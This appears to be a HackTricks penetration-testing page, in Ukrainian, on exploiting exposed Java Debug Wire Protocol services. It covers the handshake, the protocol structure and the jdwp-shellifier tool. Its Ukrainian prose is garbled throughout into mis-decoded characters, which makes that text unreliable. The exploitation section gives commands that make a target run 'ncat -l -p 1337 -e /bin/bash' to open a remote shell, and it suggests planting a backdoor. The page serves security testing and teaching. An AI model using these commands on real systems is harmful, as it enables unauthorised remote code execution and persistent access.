# –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è JDWP - –ü—Ä–æ—Ç–æ–∫–æ–ª –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è Java

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub**.

</details>

## –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è JDWP “ë—Ä—É–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ **–≤—ñ–¥—Å—É—Ç–Ω–æ—Å—Ç—ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –≤ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ**. –ó–∞–∑–≤–∏—á–∞–π –≤—ñ–Ω –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ **–ø–æ—Ä—Ç—É 8000**, –∞–ª–µ –º–æ–∂–ª–∏–≤—ñ —ñ–Ω—à—ñ –ø–æ—Ä—Ç–∏. –ü–æ—á–∞—Ç–∫–æ–≤–µ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è "JDWP-Handshake" –Ω–∞ —Ü—ñ–ª—å–æ–≤–∏–π –ø–æ—Ä—Ç. –Ø–∫—â–æ —Å–ª—É–∂–±–∞ JDWP –∞–∫—Ç–∏–≤–Ω–∞, –≤–æ–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ç–∏–º —Å–∞–º–∏–º —Ä—è–¥–∫–æ–º, –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—é—á–∏ —Å–≤–æ—é –ø—Ä–∏—Å—É—Ç–Ω—ñ—Å—Ç—å. –¶–µ–π —Ä—É–∫–æ—Å—Ç–∏—Å–∫ –¥—ñ—î —è–∫ –º–µ—Ç–æ–¥ –≤—ñ–¥–±–æ—Ä—É –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Å–ª—É–∂–± JDWP –≤ –º–µ—Ä–µ–∂—ñ.

–©–æ–¥–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø—Ä–æ—Ü–µ—Å—É, –ø–æ—à—É–∫ —Ä—è–¥–∫–∞ "jdwk" –≤ –ø—Ä–æ—Ü–µ—Å–∞—Ö Java –º–æ–∂–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –∞–∫—Ç–∏–≤–Ω—É —Å–µ—Å—ñ—é JDWP.

–û—Å–Ω–æ–≤–Ω–∏–º —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º —î [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
–Ø –≤–∏—è–≤–∏–≤, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `--break-on 'java.lang.String.indexOf'` —Ä–æ–±–∏—Ç—å –µ–∫—Å–ø–ª–æ–π—Ç –±—ñ–ª—å—à **—Å—Ç–∞–±—ñ–ª—å–Ω–∏–º**. –Ü —è–∫—â–æ —É –≤–∞—Å —î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ backdoor –Ω–∞ —Ö–æ—Å—Ç —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏, –µ–∫—Å–ø–ª–æ–π—Ç –±—É–¥–µ —â–µ —Å—Ç–∞–±—ñ–ª—å–Ω—ñ—à–∏–º.

## –î–µ—Ç–∞–ª—å–Ω—ñ—à–µ

**–¶–µ –∫—Ä–∞—Ç–∫–∏–π –æ–≥–ª—è–¥ [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –π–æ–≥–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π.


1. **–û–≥–ª—è–¥ JDWP**:
- –¶–µ –º–µ—Ä–µ–∂–µ–≤–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π –ø—Ä–æ—Ç–æ–∫–æ–ª –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–∞–∫–µ—Ç—ñ–≤, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∏–π.
- –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º –ø—Ä–∏ –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –≤–æ—Ä–æ–∂–∏–º–∏ –º–µ—Ä–µ–∂–∞–º–∏.

2. **–†—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è JDWP**:
- –î–ª—è —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø—Ä–æ—Å—Ç–∏–π –ø—Ä–æ—Ü–µ—Å —Ä—É–∫–æ—Å—Ç–∏—Å–∫–∞–Ω–Ω—è. –ú—ñ–∂ –≤—ñ–¥–ª–∞–≥–æ–¥–∂—É–≤–∞—á–µ–º (–∫–ª—ñ—î–Ω—Ç–æ–º) —Ç–∞ –≤—ñ–¥–ª–∞–≥–æ–¥–∂—É–≤–∞–Ω–∏–º (—Å–µ—Ä–≤–µ—Ä–æ–º) –æ–±–º—ñ–Ω—é—î—Ç—å—Å—è 14-—Å–∏–º–≤–æ–ª—å–Ω–∏–π ASCII-—Ä—è–¥–æ–∫ "JDWP-Handshake".

3. **–ö–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è JDWP**:
- –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –º–∞—é—Ç—å –ø—Ä–æ—Å—Ç—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É –∑ –ø–æ–ª—è–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ –î–æ–≤–∂–∏–Ω–∞, –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä, –ü—Ä–∞–ø–æ—Ä —Ç–∞ –ù–∞–±—ñ—Ä–ö–æ–º–∞–Ω–¥.
- –ó–Ω–∞—á–µ–Ω–Ω—è –ù–∞–±–æ—Ä—É–ö–æ–º–∞–Ω–¥ –∫–æ–ª–∏–≤–∞—é—Ç—å—Å—è –≤—ñ–¥ 0x40 –¥–æ 0x80, —â–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç—å —Ä—ñ–∑–Ω—ñ –¥—ñ—ó —Ç–∞ –ø–æ–¥—ñ—ó.

4. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è**:
- JDWP –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ç–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –∫–ª–∞—Å–∏ —Ç–∞ –±–∞–π—Ç–∫–æ–¥, —â–æ —Å—Ç–≤–æ—Ä—é—î —Ä–∏–∑–∏–∫–∏ –±–µ–∑–ø–µ–∫–∏.
- –°—Ç–∞—Ç—Ç—è –¥–µ—Ç–∞–ª—ñ–∑—É—î –ø—Ä–æ—Ü–µ—Å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —É –ø'—è—Ç–∏ –∫—Ä–æ–∫–∞—Ö, —â–æ –≤–∫–ª—é—á–∞—î –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ—Å–∏–ª–∞–Ω—å –Ω–∞ Java Runtime, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–æ—á–æ–∫ –∑—É–ø–∏–Ω–∫–∏ —Ç–∞ –≤–∏–∫–ª–∏–∫ –º–µ—Ç–æ–¥—ñ–≤.

5. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É –∂–∏—Ç—Ç—ñ**:
- –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –∑–∞—Ö–∏—Å–Ω—ñ –∑–∞—Ö–æ–¥–∏ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä—É, —Å–ª—É–∂–±–∏ JDWP –≤–∏—è–≤–ª—è—é—Ç—å—Å—è —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å—Å—è –≤ —Ä–µ–∞–ª—å–Ω–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –ø–æ—à—É–∫–∞–º–∏ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ ShodanHQ —Ç–∞ GitHub.
- –°–∫—Ä–∏–ø—Ç –µ–∫—Å–ø–ª–æ–π—Ç—É –±—É–≤ –ø—Ä–æ—Ç–µ—Å—Ç–æ–≤–∞–Ω–∏–π –Ω–∞ —Ä—ñ–∑–Ω–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö JDK —Ç–∞ —î –ø–ª–∞—Ç—Ñ–æ—Ä–º–æ–Ω–µ–∑–∞–ª–µ–∂–Ω–∏–º, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –Ω–∞–¥—ñ–π–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –Ω–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–º—É —Å–µ—Ä–≤–µ—Ä—ñ (RCE).

6. **–ù–∞—Å–ª—ñ–¥–∫–∏ –¥–ª—è –±–µ–∑–ø–µ–∫–∏**:
- –ù–∞—è–≤–Ω—ñ—Å—Ç—å –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Å–ª—É–∂–± JDWP –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ –±–µ–∑–ø–µ–∫–∏, –≤–∏–º–∫–Ω–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–π –≤—ñ–¥–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω—ñ —Ç–∞ –Ω–∞–ª–µ–∂–Ω–æ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∞.


### **–ü–æ—Å–∏–ª–∞–Ω–Ω—è:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
